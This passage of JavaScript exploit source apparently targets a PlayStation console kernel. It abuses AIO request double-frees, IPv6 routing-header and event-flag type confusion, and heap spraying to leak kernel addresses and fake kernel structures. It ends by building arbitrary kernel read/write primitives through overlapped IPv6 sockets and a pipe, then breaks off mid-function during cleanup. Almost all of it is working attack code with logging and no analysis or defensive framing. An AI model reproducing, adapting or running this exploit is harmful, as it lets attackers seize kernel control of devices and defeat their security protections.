    const tclass = malloc(4);

    for (let loop = 1; loop <= NUM_ALIAS; loop++) {
        // Set markers via IPV6_TCLASS
        for (let i = 0; i < sds.length; i++) {
            write32_uncompressed(tclass, i + 1);
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4n);
        }

        // Check for aliasing
        for (let i = 0; i < sds.length; i++) {
            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
            const marker = Number(read32_uncompressed(tclass));

            if (marker !== i + 1) {
                const sd_pair = [sds[i], sds[marker - 1]];
                logger.log("aliased pktopts at attempt: " + loop + " (found pair: " + sd_pair[0] + " " + sd_pair[1] + ")");

                // Remove aliased sockets (marker > i assumed)
                sds.splice(marker - 1, 1);
                sds.splice(i, 1);

                // Add new sockets with pktopts while double-freed memory can't be reused
                for (let k = 0; k < 2; k++) {
                    const sock_fd = new_socket();
                    ssockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4n);
                    sds.push(sock_fd);
                }

                return sd_pair;
            }
        }

        // Free pktopts for retry
        for (let i = 0; i < sds.length; i++) {
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0n, 0n);
        }
    }

    return null;
}

//
// Leak kernel addresses via EVF type confusion
//
function leak_kernel_addrs(sd_pair, sds) {
    const sd = sd_pair[0];
    const buflen = 0x80 * LEAK_LEN;
    const buf = malloc(buflen);

    // Type confuse a struct evf with a struct ip6_rthdr
    // The flags of the evf must be set to >= 0xf00 to fully leak rthdr contents
    logger.log("confuse evf with rthdr");

    const name = malloc(1);
    write8_uncompressed(name, 0);

    // Free one of the rthdrs
    syscall(SYSCALL.close, sd_pair[1]);

    let evf = null;
    for (let i = 1; i <= NUM_ALIAS; i++) {
        const evfs = [];

        // Reclaim freed rthdr with evf objects
        for (let j = 1; j <= NUM_HANDLES; j++) {
            const evf_flags = 0xf00 | (j << 16);
            evfs.push(new_evf(name, evf_flags));
        }

        get_rthdr(sd, buf, 0x80);

        // For simplicity, assume i < 2**16
        const flag = Number(read32_uncompressed(buf));

        if ((flag & 0xf00) === 0xf00) {
            const idx = flag >>> 16;
            const expected_flag = flag | 1;

            evf = evfs[idx - 1];  // JS is 0-indexed, Lua is 1-indexed

            set_evf_flags(evf, expected_flag);
            get_rthdr(sd, buf, 0x80);

            const val = Number(read32_uncompressed(buf));
            if (val === expected_flag) {
                // Remove evf from list so we don't free it
                evfs.splice(idx - 1, 1);
            } else {
                evf = null;
            }
        }

        // Free unused evfs
        for (const each_evf of evfs) {
            free_evf(each_evf);
        }

        if (evf !== null) {
            logger.log("confused rthdr and evf at attempt: " + i);
            break;
        }
    }

    if (evf === null) {
        throw new Error("failed to confuse evf and rthdr");
    }

    // ip6_rthdr and evf obj are overlapped now
    // Enlarge ip6_rthdr by writing to its len field via evf's flag
    set_evf_flags(evf, 0xff << 8);

    // Fields from evf (offset in hex):
    // struct evf:
    //     0 u64 flags
    //     28 struct cv cv
    //     38 TAILQ_HEAD(struct evf_waiter) waiters

    // Read enlarged rthdr to get kernel pointers
    get_rthdr(sd, buf, buflen);

    // evf.cv.cv_description = "evf cv" string in kernel ELF
    const kernel_addr = read64_uncompressed(buf + 0x28n);
    logger.log("\"evf cv\" string addr: " + hex(kernel_addr));

    // evf.waiters.tqh_last == &evf.waiters.tqh_first
    // This gives us the kernel buffer address
    const kbuf_addr = read64_uncompressed(buf + 0x40n) - 0x38n;
    logger.log("kernel buffer addr: " + hex(kbuf_addr));

    //
    // Prep to fake reqs3 (aio_batch)
    //
    const wbufsz = 0x80;
    const wbuf = malloc(wbufsz);
    const rsize = build_rthdr(wbuf, wbufsz);
    const marker_val = 0xdeadbeef;
    const reqs3_offset = 0x10n;

    write32_uncompressed(wbuf + 4n, marker_val);
    write32_uncompressed(wbuf + reqs3_offset + 0n, 1);   // .ar3_num_reqs
    write32_uncompressed(wbuf + reqs3_offset + 4n, 0);   // .ar3_reqs_left
    write32_uncompressed(wbuf + reqs3_offset + 8n, AIO_STATE_COMPLETE);  // .ar3_state
    write8_uncompressed(wbuf + reqs3_offset + 0xcn, 0);  // .ar3_done
    write32_uncompressed(wbuf + reqs3_offset + 0x28n, 0x67b0000);  // .ar3_lock.lock_object.lo_flags
    write64_uncompressed(wbuf + reqs3_offset + 0x38n, 1n);  // .ar3_lock.lk_lock = LK_UNLOCKED

    //
    // Prep to leak reqs2 (aio_entry)
    //
    // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
    // allocate reqs1 arrays at 0x100 malloc zone
    const num_elems = 6;

    // Use reqs1 to fake an aio_info
    // Set .ai_cred (offset 0x10) to offset 4 of reqs2 so crfree(ai_cred)
    // will harmlessly decrement the .ar2_ticket field
    const ucred = kbuf_addr + 4n;
    const leak_reqs = make_reqs1(num_elems);
    write64_uncompressed(leak_reqs + 0x10n, ucred);

    const num_loop = NUM_SDS;
    const leak_ids_len = num_loop * num_elems;
    const leak_ids = malloc(4 * leak_ids_len);
    const step = 4 * num_elems;
    const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

    let reqs2_off = null;
    let fake_reqs3_off = null;
    let fake_reqs3_sd = null;

    for (let i = 1; i <= NUM_LEAKS; i++) {
        // Spray reqs2 and rthdr with fake reqs3
        for (let j = 1; j <= num_loop; j++) {
            write32_uncompressed(wbuf + 8n, j);
            aio_submit_cmd(cmd, leak_reqs, num_elems, leak_ids + BigInt((j - 1) * step));
            set_rthdr(sds[j - 1], wbuf, rsize);
        }

        // Out of bound read on adjacent malloc 0x80 memory
        get_rthdr(sd, buf, buflen);

        let sd_idx = null;
        reqs2_off = null;
        fake_reqs3_off = null;

        for (let off = 0x80; off < buflen; off += 0x80) {
            if (reqs2_off === null && verify_reqs2(buf + BigInt(off), AIO_CMD_WRITE)) {
                reqs2_off = off;
            }

            if (fake_reqs3_off === null) {
                const marker = Number(read32_uncompressed(buf + BigInt(off + 4)));
                if (marker === marker_val) {
                    fake_reqs3_off = off;
                    sd_idx = Number(read32_uncompressed(buf + BigInt(off + 8)));
                }
            }
        }

        if (reqs2_off !== null && fake_reqs3_off !== null) {
            logger.log("found reqs2 and fake reqs3 at attempt: " + i);
            fake_reqs3_sd = sds[sd_idx - 1];
            sds.splice(sd_idx - 1, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
        }

        free_aios(leak_ids, leak_ids_len);
    }

    if (reqs2_off === null || fake_reqs3_off === null) {
        throw new Error("could not leak reqs2 and fake reqs3");
    }

    logger.log("reqs2 offset: " + hex(reqs2_off));
    logger.log("fake reqs3 offset: " + hex(fake_reqs3_off));

    get_rthdr(sd, buf, buflen);

    logger.log("leaked aio_entry:");
    // Log first few bytes of reqs2
    for (let i = 0; i < 0x58; i += 8) {
        logger.log("  [" + hex(i) + "] = " + hex(read64_uncompressed(buf + BigInt(reqs2_off + i))));
    }

    // Store for curproc leak later
    const aio_info_addr = read64_uncompressed(buf + BigInt(reqs2_off + 0x18));

    // reqs1 is allocated from malloc 0x100 zone, must be aligned at 0xff..xx00
    let reqs1_addr = read64_uncompressed(buf + BigInt(reqs2_off + 0x10));
    reqs1_addr = reqs1_addr & ~0xffn;

    const fake_reqs3_addr = kbuf_addr + BigInt(fake_reqs3_off) + reqs3_offset;

    logger.log("reqs1_addr = " + hex(reqs1_addr));
    logger.log("fake_reqs3_addr = " + hex(fake_reqs3_addr));

    logger.log("searching target_id");

    let target_id = null;
    let to_cancel = null;
    let to_cancel_len = null;

    for (let i = 0; i < leak_ids_len; i += num_elems) {
        aio_multi_cancel(leak_ids + BigInt(i * 4), num_elems);
        get_rthdr(sd, buf, buflen);

        const state = Number(read32_uncompressed(buf + BigInt(reqs2_off + 0x38)));
        if (state === AIO_STATE_ABORTED) {
            target_id = Number(read32_uncompressed(leak_ids + BigInt(i * 4)));
            write32_uncompressed(leak_ids + BigInt(i * 4), 0);

            logger.log("found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));

            const start = i + num_elems;
            to_cancel = leak_ids + BigInt(start * 4);
            to_cancel_len = leak_ids_len - start;

            break;
        }
    }

    if (target_id === null) {
        throw new Error("target id not found");
    }

    cancel_aios(to_cancel, to_cancel_len);
    free_aios2(leak_ids, leak_ids_len);

    return {
        reqs1_addr,
        kbuf_addr,
        kernel_addr,
        target_id,
        evf,
        fake_reqs3_addr,
        fake_reqs3_sd,
        aio_info_addr
    };
}

//
// Double free reqs1 (0x100 malloc zone) to get aliased pktopts
//
function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
    const max_leak_len = (0xff + 1) << 3;  // 0x800
    const buf = malloc(max_leak_len);

    const num_elems = MAX_AIO_IDS;
    const aio_reqs = make_reqs1(num_elems);

    const num_batches = 2;
    const aio_ids_len = num_batches * num_elems;
    const aio_ids = malloc(4 * aio_ids_len);

    logger.log("start overwrite rthdr with AIO queue entry loop");
    let aio_not_found = true;
    free_evf(evf);

    for (let i = 1; i <= NUM_CLOBBERS; i++) {
        spray_aio(num_batches, aio_reqs, num_elems, aio_ids);

        const size_ret = get_rthdr(sd, buf, max_leak_len);
        const cmd = Number(read32_uncompressed(buf));

        if (size_ret === 8 && cmd === AIO_CMD_READ) {
            logger.log("aliased at attempt: " + i);
            aio_not_found = false;
            cancel_aios(aio_ids, aio_ids_len);
            break;
        }

        free_aios(aio_ids, aio_ids_len);
    }

    if (aio_not_found) {
        throw new Error("failed to overwrite rthdr");
    }

    // Build fake reqs2 structure
    const reqs2_size = 0x80;
    const reqs2 = malloc(reqs2_size);
    const rsize = build_rthdr(reqs2, reqs2_size);

    write32_uncompressed(reqs2 + 4n, 5);              // .ar2_ticket
    write64_uncompressed(reqs2 + 0x18n, reqs1_addr);  // .ar2_info
    write64_uncompressed(reqs2 + 0x20n, fake_reqs3_addr);  // .ar2_batch

    const states = malloc(4 * num_elems);
    const addr_cache = [];
    for (let i = 0; i < num_batches; i++) {
        addr_cache.push(aio_ids + BigInt(i * num_elems * 4));
    }

    logger.log("start overwrite AIO queue entry with rthdr loop");

    // Close the confused socket
    syscall(SYSCALL.close, sd);

    // Inner function to find and overwrite AIO entry
    function overwrite_aio_entry_with_rthdr() {
        for (let i = 1; i <= NUM_ALIAS; i++) {
            // Spray rthdrs with fake reqs2
            for (let j = 0; j < NUM_SDS; j++) {
                set_rthdr(sds[j], reqs2, rsize);
            }

            // Check each batch for state change
            for (let batch = 0; batch < addr_cache.length; batch++) {
                // Initialize states to -1
                for (let j = 0; j < num_elems; j++) {
                    write32_uncompressed(states + BigInt(j * 4), 0xffffffff);
                }

                aio_multi_cancel(addr_cache[batch], num_elems, states);

                // Find entry with AIO_STATE_COMPLETE
                let req_idx = -1;
                for (let j = 0; j < num_elems; j++) {
                    const val = Number(read32_uncompressed(states + BigInt(j * 4)));
                    if (val === AIO_STATE_COMPLETE) {
                        req_idx = j;
                        break;
                    }
                }

                if (req_idx !== -1) {
                    logger.log("states[" + req_idx + "] = " + hex(read32_uncompressed(states + BigInt(req_idx * 4))));
                    logger.log("found req_id at batch: " + batch);
                    logger.log("aliased at attempt: " + i);

                    const aio_idx = batch * num_elems + req_idx;
                    const req_id_p = aio_ids + BigInt(aio_idx * 4);
                    const req_id = Number(read32_uncompressed(req_id_p));

                    logger.log("req_id = " + hex(req_id));

                    aio_multi_poll(req_id_p, 1, states);
                    logger.log("states[0] = " + hex(read32_uncompressed(states)));
                    write32_uncompressed(req_id_p, 0);

                    return req_id;
                }
            }
        }
        return null;
    }

    const req_id = overwrite_aio_entry_with_rthdr();
    if (req_id === null) {
        throw new Error("failed to overwrite AIO queue entry");
    }

    free_aios2(aio_ids, aio_ids_len);

    const target_id_p = malloc(4);
    write32_uncompressed(target_id_p, target_id);

    // Enable deletion of target_id
    aio_multi_poll(target_id_p, 1, states);
    logger.log("target's state: " + hex(read32_uncompressed(states)));

    const sce_errs = malloc(8);
    write32_uncompressed(sce_errs, 0xffffffff);
    write32_uncompressed(sce_errs + 4n, 0xffffffff);

    const target_ids = malloc(8);
    write32_uncompressed(target_ids, req_id);
    write32_uncompressed(target_ids + 4n, target_id);

    // Double free on malloc 0x100 by:
    //   - freeing target_id's aio_object->reqs1
    //   - freeing req_id's aio_object->aio_entries[x]->ar2_info
    //      - ar2_info points to same addr as target_id's aio_object->reqs1

    logger.log("triggering double free on 0x100 malloc zone");
    aio_multi_delete(target_ids, 2, sce_errs);

    // Reclaim first since sanity checking is longer - reduces chance of
    // another process claiming the memory
    logger.log("attempting to reclaim with aliased pktopts");
    const sd_pair = make_aliased_pktopts(sds_alt);

    const err1 = Number(read32_uncompressed(sce_errs));
    const err2 = Number(read32_uncompressed(sce_errs + 4n));
    logger.log("delete errors: " + hex(err1) + " " + hex(err2));

    write32_uncompressed(states, 0xffffffff);
    write32_uncompressed(states + 4n, 0xffffffff);

    aio_multi_poll(target_ids, 2, states);
    logger.log("target states: " + hex(read32_uncompressed(states)) + " " + hex(read32_uncompressed(states + 4n)));

    let success = true;
    if (Number(read32_uncompressed(states)) !== SCE_KERNEL_ERROR_ESRCH) {
        logger.log("ERROR: bad delete of corrupt AIO request");
        success = false;
    }

    if (err1 !== 0 || err1 !== err2) {
        logger.log("ERROR: bad delete of ID pair");
        success = false;
    }

    if (!success) {
        throw new Error("double free on 0x100 malloc zone failed");
    }

    if (sd_pair === null) {
        throw new Error("failed to make aliased pktopts");
    }

    return sd_pair;
}

//
// Kernel object - stores kernel addresses and provides read/write primitives
//
const kernel = {
    curproc: 0n,
    curproc_fd: 0n,
    curproc_ofiles: 0n,
    inside_kdata: 0n,
    data_base: 0n,

    // These get set after IPv6KernelRW is initialized
    read_buffer: null,
    write_buffer: null,

    read_byte(kaddr) {
        const buf = this.read_buffer(kaddr, 1);
        return Number(read8_uncompressed(buf));
    },

    read_word(kaddr) {
        const buf = this.read_buffer(kaddr, 2);
        return Number(read16_uncompressed(buf));
    },

    read_dword(kaddr) {
        const buf = this.read_buffer(kaddr, 4);
        return Number(read32_uncompressed(buf));
    },

    read_qword(kaddr) {
        const buf = this.read_buffer(kaddr, 8);
        return read64_uncompressed(buf);
    },

    write_byte(kaddr, value) {
        const buf = malloc(1);
        write8_uncompressed(buf, value);
        this.write_buffer(kaddr, buf, 1);
    },

    write_word(kaddr, value) {
        const buf = malloc(2);
        write16_uncompressed(buf, value);
        this.write_buffer(kaddr, buf, 2);
    },

    write_dword(kaddr, value) {
        const buf = malloc(4);
        write32_uncompressed(buf, value);
        this.write_buffer(kaddr, buf, 4);
    },

    write_qword(kaddr, value) {
        const buf = malloc(8);
        write64_uncompressed(buf, BigInt(value));
        this.write_buffer(kaddr, buf, 8);
    },

    read_null_terminated_string(kaddr) {
        let result = "";
        while (true) {
            const buf = this.read_buffer(kaddr, 8);
            for (let i = 0; i < 8; i++) {
                const c = Number(read8_uncompressed(buf + BigInt(i)));
                if (c === 0) return result;
                result += String.fromCharCode(c);
            }
            kaddr += 8n;
        }
    }
};

//
// IPv6KernelRW - uses overlapped IPv6 socket pktopts for kernel r/w
// (Using object pattern instead of class for PS4 compatibility)
//
const ipv6_kernel_rw = {
    data: {
        pipe_read_fd: 0,
        pipe_write_fd: 0,
        pipe_addr: 0n,
        pipemap_buffer: null,
        read_mem: null,
        master_target_buf: null,
        slave_buf: null,
        pktinfo_size_store: null,
        master_sock: 0n,
        victim_sock: 0n
    },
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;

    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * KERNEL_OFFSETS.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);  // fde_file
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);  // f_data
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const pipe_fds = malloc(8);
    const ret = syscall(SYSCALL.pipe, pipe_fds);
    if (is_error(ret)) {
        throw new Error("pipe failed in IPv6KernelRW");
    }

    ipv6_kernel_rw.data.pipe_read_fd = Number(read32_uncompressed(pipe_fds));
    ipv6_kernel_rw.data.pipe_write_fd = Number(read32_uncompressed(pipe_fds + 4n));
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(ipv6_kernel_rw.data.pipe_read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);

    logger.log("IPv6KernelRW pipe created: read=" + ipv6_kernel_rw.data.pipe_read_fd + " write=" + ipv6_kernel_rw.data.pipe_write_fd);
    logger.log("pipe_addr = " + hex(ipv6_kernel_rw.data.pipe_addr));
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    ipv6_kernel_rw.data.master_target_buf = malloc(0x14);
    ipv6_kernel_rw.data.slave_buf = malloc(0x14);
    ipv6_kernel_rw.data.pktinfo_size_store = malloc(8);

    write64_uncompressed(ipv6_kernel_rw.data.pktinfo_size_store, 0x14n);

    ipv6_kernel_rw.data.master_sock = new_socket();
    ipv6_kernel_rw.data.victim_sock = new_socket();

    // Create pktopts on both sockets
    ssockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buf, 0x14n);
    ssockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.slave_buf, 0x14n);

    // Get pktopts addresses
    const master_so = ipv6_kernel_rw.get_fd_data_addr(Number(ipv6_kernel_rw.data.master_sock));
    const master_pcb = ipv6_kernel_rw.kread8(master_so + KERNEL_OFFSETS.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + KERNEL_OFFSETS.INPCB_PKTOPTS);

    const slave_so = ipv6_kernel_rw.get_fd_data_addr(Number(ipv6_kernel_rw.data.victim_sock));
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + KERNEL_OFFSETS.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + KERNEL_OFFSETS.INPCB_PKTOPTS);

    logger.log("master_pktopts = " + hex(master_pktopts));
    logger.log("slave_pktopts = " + hex(slave_pktopts));

    // Magic: make master's pktinfo point to slave's pktinfo
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);

    logger.log("IPv6KernelRW overlapped sockets created");
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buf, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buf + 8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.master_target_buf + 0x10n, 0n);
    ssockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buf, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    gsockopt(Number(ipv6_kernel_rw.data.victim_sock), IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    ssockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buf);
    return read64_uncompressed(ipv6_kernel_rw.data.slave_buf);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
    // Set pipe buffer for read direction
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    // Set source address
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    // Read from pipe
    syscall(SYSCALL.read, BigInt(ipv6_kernel_rw.data.pipe_read_fd), uaddr, BigInt(len));
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
    // Set pipe buffer for write direction
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    // Set destination address
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    // Write to pipe
    syscall(SYSCALL.write, BigInt(ipv6_kernel_rw.data.pipe_write_fd), uaddr, BigInt(len));
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }
    ipv6_kernel_rw.copyout(kaddr, mem, len);
    return mem;
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf, len) {
    ipv6_kernel_rw.copyin(buf, kaddr, len);
};

//
// Make kernel arbitrary read/write
//
function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
    try {
        const master_sock = pktopts_sds[0];
        const tclass = malloc(4);

        const pktopts_size = 0x100;
        const pktopts = malloc(pktopts_size);
        const rsize = build_rthdr(pktopts, pktopts_size);
        const pktinfo_p = k100_addr + 0x10n;

        // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
        write64_uncompressed(pktopts + 0x10n, pktinfo_p);

        logger.log("overwrite main pktopts");
        let reclaim_sock = null;

        // Close second aliased socket to free its pktopts
        syscall(SYSCALL.close, BigInt(pktopts_sds[1]));

        for (let i = 1; i <= NUM_ALIAS; i++) {
            // Spray rthdrs with fake pktopts
            for (let j = 0; j < sds_alt.length; j++) {
                // If socket doesn't have pktopts, setting rthdr will make one
                // Make sure sockets already have pktopts
                write32_uncompressed(pktopts + OFF_TCLASS, 0x4141n | (BigInt(j) << 16n));
                set_rthdr(sds_alt[j], pktopts, rsize);
            }

            gsockopt(Number(master_sock), IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
            const marker = read32_uncompressed(tclass);

            if ((marker & 0xffffn) === 0x4141n) {
                logger.log("found reclaim sd at attempt: " + i);
                const idx = Number(marker >> 16n);
                reclaim_sock = sds_alt[idx];
                sds_alt.splice(idx, 1);
                break;
            }
        }

        if (reclaim_sock === null) {
            throw new Error("failed to overwrite main pktopts");
        }

        const pktinfo_len = 0x14;
        const pktinfo = malloc(pktinfo_len);
        write64_uncompressed(pktinfo, pktinfo_p);

        const read_buf = malloc(8);

        // Slow kernel read - reads 8 bytes using nexthop trick
        function slow_kread8(addr) {
            const len = 8;
            let offset = 0;

            while (offset < len) {
                // pktopts.ip6po_nhinfo = addr + offset
                write64_uncompressed(pktinfo + 8n, addr + BigInt(offset));

                ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, BigInt(pktinfo_len));
                const n = gsockopt(Number(master_sock), IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + BigInt(offset), len - offset);

                if (n === 0) {
                    write8_uncompressed(read_buf + BigInt(offset), 0);
                    offset = offset + 1;
                } else {
                    offset = offset + n;
                }
            }

            return read64_uncompressed(read_buf);
        }

        // Test slow_kread8
        const test_read = slow_kread8(kernel_addr);
        logger.log("slow_kread8(&\"evf cv\"): " + hex(test_read));

        // Read null-terminated string
        let kstr = "";
        for (let i = 0; i < 8; i++) {
            const c = Number(read8_uncompressed(read_buf + BigInt(i)));
            if (c === 0) break;
            kstr += String.fromCharCode(c);
        }
        logger.log("*(\"evf cv\"): " + kstr);

        if (kstr !== "evf cv") {
            throw new Error("test read of &\"evf cv\" failed");
        }

        logger.log("slow arbitrary kernel read achieved");

        // Get curproc from aio_info (assuming freed aio_info still has pointer)
        const curproc = slow_kread8(aio_info_addr + 8n);

        if (Number(curproc >> 48n) !== 0xffff) {
            throw new Error("invalid curproc kernel address: " + hex(curproc));
        }

        // Verify curproc by checking PID
        const possible_pid = slow_kread8(curproc + KERNEL_OFFSETS.PROC_PID);
        const current_pid = syscall(SYSCALL.getpid);

        if ((possible_pid & 0xffffffffn) !== (current_pid & 0xffffffffn)) {
            throw new Error("curproc verification failed: " + hex(curproc));
        }

        logger.log("curproc = " + hex(curproc));

        kernel.curproc = curproc;
        kernel.curproc_fd = slow_kread8(kernel.curproc + KERNEL_OFFSETS.PROC_FD);
        kernel.curproc_ofiles = slow_kread8(kernel.curproc_fd) + KERNEL_OFFSETS.FILEDESC_OFILES;
        kernel.inside_kdata = kernel_addr;

        logger.log("curproc_fd = " + hex(kernel.curproc_fd));
        logger.log("curproc_ofiles = " + hex(kernel.curproc_ofiles));

        // Helper functions
        function get_fd_data_addr(sock, kread8_fn) {
            const filedescent_addr = kernel.curproc_ofiles + BigInt(sock) * KERNEL_OFFSETS.SIZEOF_OFILES;
            const file_addr = kread8_fn(filedescent_addr + 0x0n);  // fde_file
            return kread8_fn(file_addr + 0x0n);  // f_data
        }

        function get_sock_pktopts(sock, kread8_fn) {
            const fd_data = get_fd_data_addr(sock, kread8_fn);
            const pcb = kread8_fn(fd_data + KERNEL_OFFSETS.SO_PCB);
            const pktopts_addr = kread8_fn(pcb + KERNEL_OFFSETS.INPCB_PKTOPTS);
            return pktopts_addr;
        }

        // Create worker socket for faster r/w
        const worker_sock = new_socket();
        const worker_pktinfo = malloc(pktinfo_len);

        // Create pktopts on worker_sock
        ssockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, BigInt(pktinfo_len));

        const worker_pktopts = get_sock_pktopts(Number(worker_sock), slow_kread8);
        logger.log("worker_pktopts = " + hex(worker_pktopts));

        // Point master's pktinfo to worker's pktinfo for faster r/w
        write64_uncompressed(pktinfo, worker_pktopts + 0x10n);  // overlap pktinfo
        write64_uncompressed(pktinfo + 8n, 0n);  // clear .ip6po_nexthop
        ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, BigInt(pktinfo_len));

        function kread20(addr, buf) {
            write64_uncompressed(pktinfo, addr);
            ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, BigInt(pktinfo_len));
            gsockopt(Number(worker_sock), IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
        }

        function kwrite20(addr, buf) {
            write64_uncompressed(pktinfo, addr);
            ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, BigInt(pktinfo_len));
            ssockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, BigInt(pktinfo_len));
        }

        function kread8(addr) {
            kread20(addr, worker_pktinfo);
            return read64_uncompressed(worker_pktinfo);
        }

        // Note: this writes 8 bytes + remaining 12 bytes as null
        function restricted_kwrite8(addr, val) {
            write64_uncompressed(worker_pktinfo, val);
            write64_uncompressed(worker_pktinfo + 8n, 0n);
            write32_uncompressed(worker_pktinfo + 0x10n, 0n);
            kwrite20(addr, worker_pktinfo);
        }

        // Test kread8
        write64_uncompressed(read_buf, kread8(kernel_addr));

        kstr = "";
        for (let i = 0; i < 8; i++) {
            const c = Number(read8_uncompressed(read_buf + BigInt(i)));
            if (c === 0) break;
            kstr += String.fromCharCode(c);
        }

        if (kstr !== "evf cv") {
            throw new Error("test read of &\"evf cv\" failed (kread8)");
        }

        logger.log("restricted kernel r/w achieved");

        // Initialize IPv6KernelRW for full arbitrary kernel r/w
        ipv6_kernel_rw.init(kernel.curproc_ofiles, kread8, restricted_kwrite8);

        kernel.read_buffer = ipv6_kernel_rw.read_buffer;
        kernel.write_buffer = ipv6_kernel_rw.write_buffer;

        // Final test
        kstr = kernel.read_null_terminated_string(kernel_addr);
        if (kstr !== "evf cv") {
            throw new Error("test read of &\"evf cv\" failed (full r/w)");
        }

        logger.log("arbitrary kernel r/w achieved!");

        // RESTORE: clean corrupt pointers
        // pktopts.ip6po_rthdr = NULL

        for (let i = 0; i < sds.length; i++) {
            const sock_pktopts = get_sock_pktopts(Number(sds[i]), kernel.read_qword.bind(kernel));
            kernel.write_qword(sock_pktopts + OFF_IP6PO_RTHDR, 0n);
        }

        const reclaimer_pktopts = get_sock_pktopts(Number(reclaim_sock), kernel.read_qword.bind(kernel));
